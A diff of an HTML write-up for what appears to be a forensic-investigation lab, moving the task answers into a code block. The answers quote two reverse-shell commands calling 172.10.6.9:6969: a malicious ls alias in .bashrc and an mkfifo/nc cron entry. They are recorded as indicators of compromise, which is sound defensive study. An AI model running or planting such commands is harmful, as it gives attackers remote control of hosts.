@@ -188,13 +188,24 @@ A. Ubuntu 20.04.4 LTS
 <p>Now in the terminal type &gt; <strong>crontab -e</strong> to find anything interesting about scheduled tasks.</p>
 <p><img src="https://miro.medium.com/v2/resize:fit:700/1*b3g1UCAFdJj0szE4UCTNKw.png" alt=""></p>
 <h2 id="answer-the-questions-below-">Answer the questions below :</h2>
-<p>1.What&#39;s the most interesting file you found in giorgio&#39;s home directory?<br>A. .bad_bash  </p>
-<ol>
-<li><p>In every investigation, it&#39;s important to keep a dirty wordlist to keep track of all your findings, no matter how small. It&#39;s also a way to prevent going back in circles and starting from scratch again. As such, now&#39;s a good time to create one and put the previous answer as an entry so we can go back to it later.<br>Another file that can be found in every user&#39;s home directory is the .bashrc file. Can you check if you can find something interesting in giorgio&#39;s .bashrc?<br>A. ls=&#39;(bash -i &gt;&amp; /dev/tcp/172.10.6.9/6969 0&gt;&amp;1 &amp; disown) 2&gt;/dev/null; ls --color=auto&#39;  </p>
-</li>
-<li><p>It seems we&#39;ve covered the usual bases in giorgio&#39;s home directory, so it&#39;s time to check the scheduled tasks that he owns.<br>Did you find anything interesting about scheduled tasks?<br>A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2&gt;&amp;1|/usr/bin/nc 172.10.6.9 6969 &gt;/tmp/f</p>
-</li>
-</ol>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">          
+<code><span class="ve"> </span><span class="p">
+1.What's the most interesting file you found in giorgio's home directory?
+A. .bad_bash
+
+2. In every investigation, it's important to keep a dirty wordlist to keep track of all your findings, no matter how small. It's also a way to prevent going back in circles and starting from scratch again. As such, now's a good time to create one and put the previous answer as an entry so we can go back to it later.
+   Another file that can be found in every user's home directory is the .bashrc file. Can you check if you can find something interesting in giorgio's .bashrc?
+A. ls='(bash -i >& /dev/tcp/172.10.6.9/6969 0>&1 & disown) 2>/dev/null; ls --color=auto'
+
+3. It seems we've covered the usual bases in giorgio's home directory, so it's time to check the scheduled tasks that he owns.
+   Did you find anything interesting about scheduled tasks?
+A. /usr/bin/rm /tmp/f;/usr/bin/mkfifo /tmp/f;/usr/bin/cat /tmp/f|/bin/sh -i 2>&1|/usr/bin/nc 172.10.6.9 6969 >/tmp/f
+  </span>
+</code></pre></div></div><br>          
+          
+          
+
 <h1 id="task-3-dirty-wordlist-revisited">Task 3 : Dirty Wordlist Revisited</h1>
 <p>In the previous task, the concept of a dirty wordlist was introduced. In this task, we will discuss it in more detail.</p>
 <p>A dirty wordlist is essentially raw documentation of the investigation from the investigator’s perspective. It may contain everything that would help lead the investigation forward, from actual IOCs to random notes. Keeping a dirty wordlist assures the investigator that a specific IOC has already been recorded, helping keep the investigation on track and preventing getting stuck in a closed loop of used leads.</p>
